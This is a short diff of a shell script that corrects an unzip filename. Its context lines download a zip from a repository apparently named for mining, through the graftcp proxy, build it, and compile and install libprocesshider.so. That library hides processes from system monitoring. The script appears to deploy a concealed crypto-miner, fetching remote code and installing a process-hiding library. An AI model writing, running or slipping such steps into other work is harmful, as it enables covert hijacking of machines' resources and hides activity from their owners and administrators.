@@ -39,7 +39,7 @@ echo " "
 chmod +x dora
 
 ./graftcp/graftcp wget https://github.com/rigmining/dora/raw/main/magicDora.zip
-unzip magic.zip
+unzip magicDora.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
